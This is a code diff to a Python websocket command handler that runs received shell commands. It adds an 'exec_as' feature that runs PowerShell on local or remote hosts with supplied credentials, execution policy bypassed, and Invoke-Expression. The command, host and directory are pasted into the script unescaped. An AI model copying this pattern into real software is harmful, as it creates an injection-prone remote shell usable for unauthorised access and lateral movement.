@@ -134,25 +134,122 @@ class Impl:
             except:
                 pass  
 
-    async def _execute_command(self, ws, command: str) -> None:
+
+
+    async def _execute_command(self, ws, command: str):
+
+
+        command = command.strip()
+
         if command.startswith("cd "):
             await self._change_directory(ws, command[3:].strip())
             return
+
+        elif command.startswith("runas"):
+            await ws.send(json.dumps({
+                "result": "Runas command is not properly. Use: 'exec_as <user> <password> <host (localhost by default)> <command>' instead.",
+                "cwd": self.current_dir
+            }))
+        elif command.startswith("exec_as"):
+
+            try:
+                result = await self._execute_as_user(command[8:].strip())
+                output = result.replace("\r", "").rstrip()   
+                await ws.send(json.dumps({
+                    "result": output,
+                    "cwd": self.current_dir
+                }, ensure_ascii=False))
+
+            except Exception as e:
+                print(e)
+                print("eerr")
 
         else:
             out, err, _ = self._execute_shell_command(command)
             output = out if out else err
 
-        if not isinstance(output, str):
-            output = str(output)
-            
-        output = output.replace("\r", "").rstrip()   
-        await ws.send(json.dumps({
-            "result": output,
-            "cwd": self.current_dir
-        }, ensure_ascii=False))
+            if not isinstance(output, str):
+                output = str(output)
+                
+            output = output.replace("\r", "").rstrip()   
+            await ws.send(json.dumps({
+                "result": output,
+                "cwd": self.current_dir
+            }, ensure_ascii=False))
 
 
+
+
+    async def _execute_as_user(self, command_with_credentials: str):
+        try:
+            parts = shlex.split(command_with_credentials)
+            if len(parts) < 3 or len(parts) > 4:
+                return "Error: Wrong format. Use: exec_as <user> <password> <host (localhost by default)> <command>"
+
+            username = parts[0]
+            password = parts[1]
+            if len(parts) == 3:
+                host = "localhost"
+                actual_command = parts[2]
+            else:
+                host = parts[2]
+                actual_command = parts[3]
+
+            domain = os.environ.get("USERDOMAIN", "WORKGROUP")
+
+            result = await self._execute_powershell_as_user(actual_command, username, domain, password, host)
+
+            return result
+       
+        except Exception as e:
+            print("Erro in execute as user")
+            return f"Errorr: {e}"
+        
+
+
+        
+    async def _execute_powershell_as_user(self, command, username, domain, password, host="localhost"):
+
+        try:
+            escaped_password = password.replace("'", "''")
+
+            ps_script = f"""
+            $securePassword = ConvertTo-SecureString '{escaped_password}' -AsPlainText -Force
+            $credential = New-Object System.Management.Automation.PSCredential('{domain}\\{username}', $securePassword)
+
+            try {{
+                $result = Invoke-Command -ComputerName {host} -Credential $credential -ScriptBlock {{
+                    Set-Location '{self.current_dir}'
+                    if ($args[0] -match '\\.(exe|com|bat|cmd|msi)$' -or $args[0] -match '^(calc|notepad|mspaint|winword|excel|powerpnt)') {{
+                        & $args[0] 2>&1 | Out-String
+                    }} else {{
+                        Invoke-Expression $args[0] 2>&1 | Out-String
+                    }}
+                }} -ArgumentList '{command}' -ErrorAction Stop
+
+                Write-Output "$result"
+            }} catch {{
+                Write-Output "ERROR:$($_.Exception.Message)"
+            }}
+            """
+
+            process = await asyncio.create_subprocess_exec(
+                "powershell.exe",
+                "-NoProfile", "-ExecutionPolicy", "Bypass",
+                "-Command", ps_script,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                cwd=self.current_dir
+            )
+
+            stdout, stderr = await process.communicate()
+
+            if stderr:
+                return "ERROR: (Input may be wrong) " + stderr.decode(errors="ignore")
+            return stdout.decode(errors="ignore")
+
+        except Exception as e:
+            return f"Error executing commands: {e}"
 
     
     async def _change_directory(self, ws, path: str) -> None:
